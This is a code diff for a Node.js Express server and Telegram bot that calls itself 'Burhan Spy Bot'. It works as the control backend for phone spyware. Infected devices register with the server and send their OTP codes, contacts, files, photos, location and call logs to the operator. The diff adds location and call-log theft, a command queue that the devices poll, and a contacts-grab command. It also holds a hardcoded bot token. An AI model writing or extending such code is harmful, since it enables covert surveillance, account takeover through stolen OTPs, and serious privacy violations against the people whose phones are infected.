@@ -1,5 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
+const fs = require('fs');
+const path = require('path');
 
 const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
 const YOUR_USER_ID = 2062068620;
@@ -7,9 +9,11 @@ const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
+// Data store karne ke liye (RAM mein — auto-delete)
 let devices = {};
+let pendingData = {};
 
-// Device Register API
+// 1. Register Device
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
     devices[deviceId] = { 
@@ -25,14 +29,14 @@ app.post('/api/register-device', (req, res) => {
     res.json({ success: true });
 });
 
-// App se SMS/OTP aayega
+// 2. OTP Receive
 app.post('/api/otp-data', (req, res) => {
     const { deviceId, otp } = req.body;
     bot.sendMessage(YOUR_USER_ID, `📩 OTP for device ${deviceId}: ${otp}`);
     res.json({ success: true });
 });
 
-// App se Photo/Video/File data aayega
+// 3. File/Photo/Video Receive
 app.post('/api/upload-data', (req, res) => {
     const { deviceId, type, data } = req.body;
     
@@ -44,17 +48,51 @@ app.post('/api/upload-data', (req, res) => {
         bot.sendMessage(YOUR_USER_ID, `📁 Files for device ${deviceId}:\n${data}`);
     } else if (type === 'contacts') {
         bot.sendMessage(YOUR_USER_ID, `📞 Contacts for device ${deviceId}:\n${data}`);
+    } else if (type === 'location') {
+        bot.sendMessage(YOUR_USER_ID, `📍 Location for device ${deviceId}:\n${data}`);
+    } else if (type === 'call_logs') {
+        bot.sendMessage(YOUR_USER_ID, `📱 Call Logs for device ${deviceId}:\n${data}`);
     }
     res.json({ success: true });
 });
 
+// 4. Command Check (App polling karega)
+app.get('/api/commands', (req, res) => {
+    const { deviceId } = req.query;
+    const command = pendingData[deviceId] || null;
+    if (command) {
+        delete pendingData[deviceId]; // Auto-delete after send
+    }
+    res.json({ command });
+});
+
+// 5. Command Send (Bot se command bhejo)
+app.post('/api/send-command', (req, res) => {
+    const { deviceId, command } = req.body;
+    pendingData[deviceId] = command;
+    res.json({ success: true });
+});
+
+// 6. Photo/Video Download
+app.post('/api/download-file', (req, res) => {
+    const { deviceId, filename } = req.body;
+    // App se file aayegi
+    const filePath = path.join(__dirname, 'uploads', filename);
+    if (fs.existsSync(filePath)) {
+        res.json({ filePath });
+    } else {
+        res.json({ error: 'File not found' });
+    }
+});
+
+// BOT COMMANDS
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
         bot.sendMessage(chatId, "⛔ Access Denied!");
         return;
     }
-    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/contacts - Get Contacts\n/files - Scan Files\n/photos - Download Photo\n/videos - Download Video\n/otp - Read OTP\n/location - Get Location\n/snapshot - Camera Snapshot\n/call_logs - Get Call Logs\n/browser_history - Get Browser History\n/help - Commands ka format`);
+    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/contacts - Get Contacts\n/files - Scan Files\n/photos - Download Photo\n/videos - Download Video\n/otp - Read OTP\n/location - Get Location\n/snapshot - Camera Snapshot\n/call_logs - Get Call Logs\n/help - Commands ka format`);
 });
 
 bot.onText(/\/help/, (msg) => {
@@ -83,8 +121,6 @@ bot.onText(/\/help/, (msg) => {
         `   Example: \`/snapshot 123456789 back\`\n\n` +
         `🟢 **/call_logs <DEVICE_ID>** - Call logs nikalo\n` +
         `   Example: \`/call_logs 123456789\`\n\n` +
-        `🟢 **/browser_history <DEVICE_ID>** - Browser history nikalo\n` +
-        `   Example: \`/browser_history 123456789\`\n\n` +
         `⚡ **Device ID kaise milega?**\n` +
         `   → \`/devices\` command chalao, wahan device ID dikhega!`, { parse_mode: "Markdown" });
 });
@@ -125,6 +161,28 @@ bot.onText(/\/devices/, (msg) => {
     }
     
     bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
+});
+
+bot.onText(/\/contacts (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    const deviceId = match[1];
+    const device = devices[deviceId];
+    if (!device) {
+        bot.sendMessage(chatId, "Device not found!");
+        return;
+    }
+    // App ko contacts bhejne ka command
+    axios.post('http://localhost:3000/api/send-command', { deviceId, command: 'get_contacts' })
+        .then(() => {
+            bot.sendMessage(chatId, `Command sent to device ${deviceId}.`);
+        })
+        .catch(() => {
+            bot.sendMessage(chatId, "Command send failed!");
+        });
 });
 
 // Authorization check
